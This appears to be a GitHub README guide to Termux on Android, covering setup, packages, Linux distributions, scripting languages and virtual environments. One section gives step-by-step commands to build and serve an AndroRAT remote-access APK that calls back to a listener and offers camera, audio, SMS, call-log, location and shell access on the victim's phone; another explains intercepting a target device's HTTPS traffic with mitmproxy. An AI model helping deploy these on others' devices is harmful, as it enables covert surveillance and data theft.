# 📱🪲🐊📟🍁🌿🌾 About Termux – Complete Guide for Beginners & Power Users

> This repository is a complete, beginner-friendly guide to using **Termux** on Android. Learn how to set it up, install powerful tools, and use Linux like a pro – all from your phone, with or without root access.

---

## 📚 Table of Contents

1. [🍁 What is Termux?](#-what-is-termux)
   
2. [🔧 Initial Setup](#-initial-setup)
   
3. [🛠️ Essential packages](#-essential-packages)
   
4. [📂 Storage Access](#-storage-access)
   
5. [💻 Linux in Termux (Proot-Distro)](#-linux-in-termux-proot-distro)
    
6. [🧰 Toolkits & Use Cases](#-toolkits--use-cases)

7. [🪲 About Termux](#-about-termux)
    
8. [⚠️ Troubleshooting & Tips](#-troubleshooting--tips)
    
9. [🪽 Contribute](#-contribute)

10. [📜 License](#-license)
   
11. [📜 Credits](#-credits)

---

## 🍁 What is Termux?

**Termux** is an Android terminal emulator and Linux environment app that doesn’t require rooting. You can:

- Run Linux packages and shells
- Install programming environments (Python, Node, etc.)
- Run SSH servers, Git, Kali, Ubuntu, and more!

🔗 [Official Termux F-Droid Page](https://f-droid.org/packages/com.termux/)

---

## 🔧 Initial Setup

1. ✅ **Install Termux from F-Droid** *(Do NOT use Play Store version)*

➤ [https://f-droid.org/packages/com.termux/](https://f-droid.org/packages/com.termux/)

2. ✅ **Update,Upgrade and install basic Essentials**
```
termux-setup-storage
pkg update && pkg upgrade -y
pkg install wget -y
pkg install git -y
pkg install tur-repo -y
pkg install x11-repo -y
pkg install termux-x11-nightly -y
pkg install pulseaudio -y
pkg install curl -y
```

3. ✅ Fix Mirrors (if slow)
```
termux-change-repo
```

---

## 🛠️ Essential packages 

python	
```
pkg install python	
```

proot-distro (Install full Linux distributions)
```
pkg install proot-distro	
```

openssh	(SSH server/client)
```
pkg install openssh	
```

termux-api (Access Android functions)
```
pkg install termux-api	
```

---

## 📂 Storage Access

To access your internal/shared storage (DCIM, Downloads, etc.):
```
termux-setup-storage
```

A popup will request permission. Tap Allow.

Access shared storage via:
```
cd /storage/emulated/0/
```

---

## 💻 Linux in Termux (Proot-Distro)

Want full Linux inside Termux? Use proot-distro.

✅ Install Ubuntu / Kali / Fedora:
```
proot-distro install ubuntu
proot-distro login ubuntu
```

Now you’re inside Ubuntu. You can install tools with apt, set up xfce, mitmproxy, dirsearch, and more.


---

## 🧰 Toolkits & Use Cases

# **💥[1]Use Arch Linux Through Termux**

🏁Initial Setup (after install)

For using sudo, first install it
```
pacman -S sudo
```

Set timezone
```
ln -sf /usr/share/zoneinfo/Region/City /etc/localtime
hwclock --systohc
```

Generate locales
```
echo "en_US.UTF-8 UTF-8" > /etc/locale.gen
locale-gen
echo "LANG=en_US.UTF-8" > /etc/locale.conf
```

Set hostname
```
echo myhostname > /etc/hostname
```

---

🧑‍💻 User Management

Add user and set password
```
useradd -m -G wheel myuser
passwd myuser
```

Allow wheel group sudo access
```
EDITOR=nano visudo
```

Then uncomment
```
#%wheel ALL=(ALL:ALL) ALL
```

---

📦 Pacman (Package Manager)

Update system (update & upgrade)
```
sudo pacman -Syu
```

Install package
```
sudo pacman -S packagename
```

Remove package
```
sudo pacman -R packagename
```

Remove package with dependencies
```
sudo pacman -Rns packagename
```

Search for package
```
pacman -Ss keyword
```

List installed packages
```
pacman -Q
```

---

🛠️ System Maintenance

Clean cache (except current packages)
```
sudo pacman -Sc
```

Clean all cache (aggressive)
```
sudo pacman -Scc
```

List orphan packages
```
pacman -Qdt
```

Remove orphan packages
```
sudo pacman -Rns $(pacman -Qdtq)
```

---

🔧 AUR (Arch User Repository)

Pacman doesn’t support AUR directly. Use an AUR helper like yay:

Install yay (requires git and base-devel)
```
git clone https://aur.archlinux.org/yay.git
cd yay
makepkg -si
```

Use yay

yay -S package-name
yay -Rns package-name
yay -Yc  # Clean orphan packages


---

🌐 Networking

Check IP
```
ip a
```

Enable & start NetworkManager (Wi-Fi/Ethernet)

sudo systemctl enable NetworkManager
sudo systemctl start NetworkManager

Use terminal UI
```
nmtui
```

---

🖥️ GUI and Display

Install Xorg
```
sudo pacman -S xorg xorg-xinit
```

Install desktop environment (example: XFCE)
```
sudo pacman -S xfce4 xfce4-goodies
```

Enable display manager (example: LightDM)

sudo pacman -S lightdm lightdm-gtk-greeter
sudo systemctl enable lightdm


---

📁 Filesystem and Disks

Mount disk
```
mount /dev/sdX1 /mnt
```
Format to ext4
```
mkfs.ext4 /dev/sdX1
```
List disks
```
lsblk
```

---

# **💥[2]mitmproxy on Android (No Root)**

**📦 Manual Download (if needed)**

Manually download mitmproxy from the browser, move to Termux file system, and extract:

🔗 [https://mitmproxy.org/downloads/](https://mitmproxy.org/downloads/)

**Rename it:**

mv <downloaded_file> mitmproxy.tar.gz

**Extract it:**
```
tar -xvzf mitmproxy.tar.gz
```

---

✅ FULL GUIDE: Install & Configure mitmproxy on Android (No Root)

📌 REQUIREMENTS

Tool	Description

Termux	Terminal emulator for Android

Python	Needed for mitmproxy

mitmproxy	Main tool for HTTPS interception

Target device(which can be android phone, computer, laptop etc with connection of internet) with proxy + cert

one main HOST device (android,pc etc) all process done in this device 



---

🧰 PART 1: Setup mitmproxy on Android

🔹 Step 1: Install Termux

1. Download Termux from F-Droid (don’t use Play Store version)
   
👉 https://f-droid.org/packages/com.termux/


2. Open Termux and run:
```
pkg update && pkg upgrade -y
pkg install python openssl curl -y

```

---

🔹 Step 2: Install mitmproxy
```
pip install mitmproxy
```

Check version:
```
mitmproxy --version
```

---

🔹 Step 3: Start mitmproxy
```
mitmproxy --mode regular --listen-port 8080
```

To run in background:
```
nohup mitmproxy --mode regular --listen-port 8080 &
```

---

📱 PART 2: Configure Target Device

🔹 Step 4: Install mitmproxy Certificate

1. On target device's browser, visit:

http://<HOST_IP>:8080

Example: 

http://192.168.1.102:8080

2. Download the certificate from(download certificate by pasting this link in browser):

mitmproxy-ca-cert.pem


3. Rename it:

mitmproxy-ca-cert.crt

4. Install it:

Go to: Settings > Security > Install from storage

Select the .crt file

Name it: mitmproxy

Certificate type: VPN and apps


✅ Confirm:

> Settings > Security > Trusted Credentials > User should show mitmproxy

---

🔹 Step 5: Set Proxy in Wi-Fi

1. On target device, go to:

Settings > Wi-Fi > [Your Network] > Advanced


2. Set:

Proxy: Manual

Hostname: IP address of OnePlus

Port: 8080


✅ Now all target device's traffic is routed through mitmproxy on HOST device 

---

👁️ PART 3: Monitor & Use mitmproxy

🔹 View Logs Live
```
mitmproxy --mode regular --listen-port 8080
```

Controls:

Navigate with arrow keys

Press ? for help

Press a to view full HTTP/HTTPS data

Press q to quit

---

🔹 Export HTTP Logs (Optional)

Save logs:
```
mitmproxy -w captured.log
```

Read logs later:
```
mitmproxy -r captured.log
```

---

🚫 PART 4: To Stop Monitoring

On target device:

Reset Wi-Fi proxy settings to None


On HOST device:
```
killall mitmproxy
```

---

🔐 Optional: Bypass Certificate Pinning

Apps like:

YouTube

Instagram

Banking apps


…may not work unless patched.

Tools required:

Frida + Objection (root or virtual space needed)

Custom patching (advanced)

---

✅ Final Summary

Step	Action

✅	Install Termux + Python

✅	pip install mitmproxy

✅	Run mitmproxy on port 8080

✅	Install cert on Samsung

✅	Set Samsung’s proxy to OnePlus

✅	View all HTTP/HTTPS traffic in Termux

---

# **💥[3]Use dirsearch in Ubuntu (Proot) in the termux**

1. 🧰 Install Python Tools

```bash
sudo apt update
sudo apt install -y python3-pip python3-setuptools python3-venv build-essential
```

---

2. 🧪 Create a Clean Virtual Environment
```
cd ~
python3 -m venv envdir
source envdir/bin/activate
```

✅ You should now see ((envdir)) in your prompt.


---

3. 🔄 Clone dirsearch Repository
```
rm -rf dirsearch
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
```

---

4. 📦 Install dirsearch Dependencies
```
pip install --upgrade pip setuptools wheel
pip install -r requirements.txt
```

✅ If this step completes without errors like pkg_resources or puccinialin, you’re ready!


---

5. 🚀 Run dirsearch
```
python3 dirsearch.py -u http://example.com -e php,html
```

---

✅ Optional: Create Quick Launch Script

Create a script called ds.sh in your home directory:
```
echo 'source ~/envdir/bin/activate && cd ~/dirsearch' > ~/ds.sh
chmod +x ~/ds.sh
```

Now you can just run:
```
./ds.sh
```

And it will activate your environment and open the dirsearch folder automatically.

🦊🦊 Happy Hunting! 🦊🦊

---

# **💥[4]AndroRAT**

# 🐍📱 AndroRAT (Remote Access Tool for Android) — GitHub Guide

> Educational use only. Do **not** use this tool for unauthorized access. Always get proper consent.

---

🔗 Clone the AndroRAT Repository

```bash
git clone https://github.com/karma9874/AndroRAT.git
```

---

⚙️ Install Dependencies
```
sudo apt install zipalign
sudo apt install python3 python3-venv -y
```

---

📁 Set Up Python Virtual Environment
```
cd AndroRAT
python3 -m venv myenv
source myenv/bin/activate
pip install --upgrade pip
```

---

🌐 Get Your Local IP Address
```
ifconfig
```

Look for your local IP (e.g. 192.168.0.X).

📌 In the following example, replace 192.0.0.2 with your actual IP.


---

📦 Build the RAT APK
```
python3 androRAT.py --build -i 192.0.0.2 -p 8000 -o rat.apk
```

---

🌍 Host the APK via HTTP Server
```
mv rat.apk ~/Documents/
cd ~/Documents
python3 -m http.server 8080
```

On the receiver side, open a browser and visit:
```
http://<your-local-ip>:8080
```

Download & install rat.apk and grant all permissions.


---

🎮 Start Listener on Master Device
```
python3 androRAT.py --shell -i 192.168.43.240 -p 8000
```

---

🛠️ Available Commands

Command	Description

deviceInfo:	Returns basic info of the device

camList:	Lists available camera IDs

takepic [cameraID]	Takes a picture using the specified camera

startVideo [cameraID]	Starts video recording

stopVideo:	Stops recording and saves the video

startAudio:	Starts audio recording

stopAudio:	Stops audio recording and saves the file

`getSMS [inbox	sent]`
getCallLogs:	Returns call logs in a file

shell:	Opens a shell session on the device

vibrate [number_of_times]	Vibrates the device

getLocation:	Returns current GPS location

getIP:	Returns the IP address of the device

getSimDetails:	Returns SIM details
getClipData:	Retrieves clipboard text

getMACAddress:	Returns MAC address

clear:	Clears the terminal screen

exit:	Exits the AndroRAT shell



---

> ⚠️ Disclaimer: This project is intended for educational purposes only. Do not use it on devices without explicit permission. Unauthorized access is illegal and unethical.

---

## 🪲 About Termux

# **💥[1]All Major Usable Scripting Languages in Termux (Android)**

Here's a complete list of scripting languages supported in Termux, including their:

Name

Use Case

Installation Command

Pros and Cons

---

1. Bash (Shell Script)

📦 Install: Comes preinstalled in Termux

✅ Use: System tasks, automation, file handling, running commands

⚡ Fast, lightweight

❌ No GUI, limited logic handling compared to Python



---

2. Python

📦 pkg install python

✅ Use: General scripting, automation, ML, AI, data analysis, networking

🌐 Libraries: requests, numpy, opencv-python, termux-api, etc.

❌ Slightly heavier than shell



---

3. PHP

📦 pkg install php

✅ Use: Web server, local dashboards, CLI scripts

Can create: php -S localhost:8000 web interface

❌ Best for web, not general automation



---

4. Node.js (JavaScript)

📦 pkg install nodejs

✅ Use: Network servers, bots, APIs, web tools

Good for CLI tools and web-based projects

❌ Async model can be tricky for beginners



---

5. Perl

📦 pkg install perl

✅ Use: Text parsing, automation, scripting

Strong with regex and older legacy tools

❌ Less popular now than Python



---

6. Ruby

📦 pkg install ruby

✅ Use: Automation, scripting, local apps

Clean syntax, also used in Metasploit

❌ Slower and heavier than Bash



---

7. Lua

📦 pkg install lua

✅ Use: Embedded scripting, game engines (e.g., LÖVE), lightweight automation

Very fast and small

❌ Minimal built-in libraries



---

8. Java

📦 pkg install openjdk

✅ Use: App development, server tools

Compile + Run .java code, use javac and java

❌ Heavy for basic scripting



---

9. C / C++ (with scripting tools)

📦 pkg install clang

✅ Use: System-level tools, performance-heavy scripting

Can be used with interpreted scripting via ch or embedded with Lua

❌ Requires compile step



---

10. Go (Golang)

📦 pkg install golang

✅ Use: Small CLI tools, concurrency-heavy scripting

Fast compile time, great for networking

❌ Learning curve for new users



---

11. Rust (for scripting via CLI tools)

📦 pkg install rust

✅ Use: Secure scripting, fast CLI apps

Modern C/C++ alternative, growing community

❌ Not interpreted, needs compilation



---

12. Haskell

📦 pkg install ghc

✅ Use: Functional scripting, educational

Great for learning, advanced math tools

❌ Niche use



---

13. R (Statistical Language)

📦 pkg install r-base

✅ Use: Data analysis, plots, statistics

Powerful for math-heavy scripting

❌ GUI-based plots limited in Termux (unless X11)



---

14. Vlang

📦 Manual install (from GitHub)

✅ Use: Modern C alternative, simple CLI tools

❌ Still maturing



---

15. Tcl

📦 pkg install tcl

✅ Use: Scripting GUIs (Tk), automation

Old but still used in some systems

❌ Less common today



---

16. Elixir / Erlang

📦 pkg install elixir or pkg install erlang

✅ Use: Concurrency, distributed systems

⚙ Used in telecom and real-time systems

❌ Niche use



---

📊 Comparison Table

Language	Best For	Lightweight	GUI Support (via Termux-X11)	Comment

| Language   | Best For                      | Lightweight | GUI Support (via Termux-X11) | Comment                          |
|------------|-------------------------------|-------------|-------------------------------|----------------------------------|
| **Bash**       | Simple scripts, automation    | ✅          | ❌                            | Native to Termux                |
| **Python**     | Everything (AI, tools, etc.)  | ⚠️ Mid      | ✅                            | Most versatile                  |
| **PHP**        | Web interfaces, servers       | ✅          | ✅ (Browser GUI)              | Easy dashboard creation         |
| **Node.js**    | Web, bots, APIs               | ⚠️ Mid      | ✅                            | Good for real-time tools        |
| **Ruby**       | Metasploit, scripting         | ⚠️ Mid      | ❌                            | Easy but slower                 |
| **Perl**       | Text parsing, sys tools       | ✅          | ❌                            | Still useful in Unix scripts    |
| **Lua**        | Embedded tools, games         | ✅✅         | ❌                            | Super fast and small            |
| **Java**       | App dev, backend tools        | ❌ Heavy     | ✅                            | Use only if needed              |
| **Rust**       | Secure fast tools             | ⚠️ Mid      | ❌                            | For advanced CLI tools          |
| **Go**         | Networking, fast builds       | ✅          | ❌                            | Modern and efficient            |
| **R**          | Data analysis                 | ❌ Heavy     | ❌ (Plotting limited)         | For stats only                  |
| **Tcl**        | GUI scripting                 | ✅          | ⚠️ Limited                    | Niche but works                 |
| **Elixir** / **Erlang** | Concurrency, distributed systems | ⚠️ Mid  | ❌                        | Advanced niche applications     |

> ✅ = Very good, ⚠️ = Moderate, ❌ = Not suitable

---

💡 Example Use Cases in Termux:

Python: Real-time voice detector, camera interface, Arduino controller

PHP: Build a web dashboard to control sensors or relays

Shell: Automate Termux tasks, monitor battery/temp, run scripts at boot

Node.js: Create a Telegram bot that responds to Termux system data



---

# **💥[2]💻What is PHP?**

PHP stands for "Hypertext Preprocessor". It is a:

Server-side scripting language

Commonly used to build dynamic websites, web apps, and APIs

Can be embedded into HTML

Executes on the server and outputs HTML to the browser


Example:
```
<?php
echo "Hello, World!";
?>
```
Output in browser: Hello, World!



---

📱 What is PHP in Termux?

In Termux, PHP can be installed and used like a local web server or scripting tool, without any browser or internet. Termux lets you use PHP to:

Run local web apps

Make web servers (e.g., using php -S)

Build Android-based control panels

Communicate with Arduino (via shell, JSON, etc.)

Build APIs or dashboards that interface with Termux or local sensors



---

🧠 Why Use PHP in Termux?

Use Case	Description

🖥️ Local Web Interface	Create a local control panel in a browser (e.g., 192.168.1.5:8000)

⚙️ IoT Control	Send commands to Arduino from your phone browser

📂 File Manager / Dashboard	Access phone files or logs via a GUI in your browser

🔗 Termux Integration	Run shell commands from PHP using shell_exec()

🧪 Sensor Data Logging	Log temperature, motion, sound etc. into a database or file

📡 HTTP API (local or remote)	Make your Termux a web server that receives data from Arduino/STM32

🔐 Login Panels / Admin Tools	Make login-protected dashboards for any local tools or sensors



---

✅ Example: Make a Web Interface to Control an LED (via Arduino)

1. 🛠 PHP script in Termux sends echo "LED_ON" > /dev/ttyUSB0


2. 🌐 Android browser opens localhost:8000


3. 🧠 PHP handles button clicks (e.g., ON/OFF)


4. 🔁 Arduino receives it via serial, turns LED on/off



---

🔧 How to Install PHP in Termux:

pkg update && pkg upgrade
pkg install php
php -v  # to check version

To run a web server:
```
php -S localhost:8080
```
Then open http://localhost:8080 in Termux-X11 browser or Android browser.


---

🔍 PHP vs Python in Termux

Feature	PHP	Python

- Web interface	Excellent	Good (Flask/Django)

- Command runner	Good with shell_exec()	Great with subprocess, os

- Mobile-friendly	Lightweight and fast	Heavier, but more flexible

- Learning curve	Easy for basic scripts	Easy to moderate

- GUI	Browser-based only	Can use Kivy, Tk (not in Termux)



---

# **💥[3]mini setups**
**🦊 create own user id and bring sudo permissions in your linux**

open your linux distribution and run:
```
apt update
apt upgrade
apt install sudo nano adduser -y
```
then add your user id:
```
adduser your_user_id
```
run:
```
nano /etc/sudoers
```
find 'root ALL=(ALL:ALL) ALL' and below this add:
```
your_user_id ALL=(ALL:ALL) ALL
```
press ctrl+x,y,Enter 

**🦊create vertual environment in termux**

pkg update && pkg upgrade -y
pkg install python -y


pkg install python-venv -y
(or)
pip install virtualenv  

virtualenv venvname  
(or)  
python -m venv venvname

source venvname/bin/activate

deactivate

---

**🦊share folder over http link**

same network connection is required (use same wi-fi network)

first go to folder which can you want to share in termux and run :
```
python -m http.server 50500
```

where 50500 is port number usable range is 49152-65535 

in second device browse in browser:

"your local ip:port number"


your local ip can be like 192.168.0.27

Here is your content properly formatted in Markdown for direct pasting into a README.md file on GitHub:

---

**🔐 View and Change Hidden Permissions in Linux**

🧾 To See Hidden Permissions

```bash
ls -la
```

---

✏️ To Change Permissions (Example)

drwx------
-rwx------

"d" → indicates a directory

"-" → indicates a file


Permission Values:

Symbol	Meaning	Value

r	Read	4
w	Write	2
x	Execute	1


👉 Total = Sum of permissions
For example:
If you want to give only write and execute permission to the user, use:

chmod 300 file_name


---

📌 Permission Structure Explained


-rwx------  # Example breakdown

First part (rwx) → User permissions

Middle part (---) → Group permissions

Last part (---) → Other (world) permissions



Each can be a combination of r, w, and x.

✅ Use this to fine-tune file and directory access for better control and security.

---

Sure! Here's the content formatted as a README.md file for GitHub, ready to paste directly:


---

# **💥4]🌐 Virtual Environments in Termux**

This guide explains how to create different types of **virtual environments in Termux**, ranging from Python isolation to full Linux distributions and QEMU-based virtualization — all without root access.

---

## 📁 Table of Contents

- [Python Virtual Environment](#-python-virtual-environment)
- [Node.js Environment using NVM](#-2-nodejs-environment-using-nvm)
- [Linux Environments using Proot-distro](#-3-linux-environments-using-proot-distro)
- [Manual Root Filesystem using Proot/Chroot](#-4-manual-root-filesystem-using-prootchroot)
- [Miniconda/Conda Environment](#-5-minicondaconda-environment)
- [Full VM with QEMU](#-6-full-vm-with-qemu)
- [Experimental: Docker-like Envs](#-7-experimental-docker-like-envs)
- [Summary Table](#-summary-table)

---

✅ 1. Python Virtual Environment

Isolate Python packages per project.

```bash
pkg install python
pip install virtualenv

# Create a virtual environment
virtualenv myenv

# Activate the environment
source myenv/bin/activate

# Deactivate
deactivate
```

Alternatively, using built-in venv:
```
python -m venv myenv
source myenv/bin/activate
```

---

✅ 2. Node.js Environment using NVM

Use multiple Node.js versions in isolated environments.
```
pkg install curl
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash

# Reload shell
source ~/.bashrc

# Install and use Node.js
nvm install 18
nvm use 18
```

---

✅ 3. Linux Environments using Proot-distro

Run full Linux distros (Ubuntu, Kali, etc.) without root.
```
pkg install proot-distro

# View available distros
proot-distro list

# Install Ubuntu
proot-distro install ubuntu

# Login
proot-distro login ubuntu
```

Each installed distro is its own virtual Linux environment.


---

✅ 4. Manual Root Filesystem using Proot/Chroot

Use prebuilt root filesystems (like Kali Rootless).

#Assuming you downloaded a rootfs
```
mkdir ~/kali-arm64
```

#Extract Kali rootfs into it

#Login manually
```
proot -S ~/kali-arm64 /bin/bash
```
Advanced users can customize startup scripts and mounts.


---

✅ 5. Miniconda/Conda Environment

Cross-language (Python, R, etc.) environments.
```
pkg install wget
wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh
bash Miniconda3-latest-Linux-aarch64.sh
```

#Activate
```
source ~/miniconda3/bin/activate
```

#Create and use environment
```
conda create -n myenv python=3.11
conda activate myenv
```

⚠️ Heavy on storage and memory.


---

✅ 6. Full VM with QEMU

Run full Linux distributions via virtualization.
```
pkg install qemu-system-aarch64
```

#Set up a disk image and ISO manually
#Example: Run a full Kali or Ubuntu VM inside Termux

Best for advanced users needing true OS-level isolation.


---

✅ 7. Experimental: Docker-like Envs

Some users get Docker-like behavior with:

fakeroot

distrobox

Custom proot containers


⚠️ Not stable on all Termux environments yet.


---

## 📊 Summary Table

| Method         | Type                   | Use Case                                |
|----------------|------------------------|------------------------------------------|
| virtualenv     | Python environment     | Python project isolation                 |
| nvm            | Node.js version manager| Manage multiple Node.js versions         |
| proot-distro   | Linux distro sandbox   | Full Debian/Ubuntu/Kali in Termux        |
| proot/chroot   | Manual rootfs          | Custom rootless Linux environments       |
| conda          | Python/R/ML environment| Heavier, more flexible than virtualenv   |
| qemu           | Virtual machine        | Full VM isolation for any OS             |
| fakeroot       | Experimental container | Docker-style Linux envs (unstable)       |


---

📌 Notes

These methods require no root.

Storage access may require permissions via: termux-setup-storage.

Termux needs regular updates: pkg update && pkg upgrade.

---
## ⚠️ Troubleshooting & Tips

Issue	Fix Command

Network tools not working	
```
pkg install net-tools
```

Package errors or 403s	
```
termux-change-repo
```

Storage access denied	
```
termux-setup-storage
```
and restart Termux

Slow repo or package install
Use mirrors via 
```
termux-change-repo
```

Permission denied errors	
Ensure files have execution permission: 
chmod +x tool_name


---

## 🪽 Contribute

Have useful commands or scripts?
PRs and issues are welcome!


---

📢 Stay Updated

🔗 Termux Wiki

🔗 r/termux subreddit

🔗 Awesome-Termux List

---

## 📜 License

This project is open-source and available under the [MIT License](LICENSE).

---

## 📜 Credits

This repository serves as a comprehensive guide to using Termux effectively on Android devices. It curates tutorials, installation steps, usage tips, and best practices for various open-source tools.

> I do not claim ownership or authorship of any of the third-party tools, scripts, or utilities referenced here.
Full credit goes to the respective developers and maintainers of those tools.



Special thanks to the creators and communities behind:

Termux

Proot-Distro

Kali Linux

Arch Linux ARM

Ubuntu

Various GitHub contributors and open-source developers


This guide exists only to simplify the process of using those tools ethically, safely, and effectively for educational purposes.


This repository Made with 💻❤️ by **[mikey-7x](https://github.com/mikey-7x)** 🚀🔥– Keep hacking, keep learning!



[other repository](https://github.com/mikey-7x?tab=repositories)

---



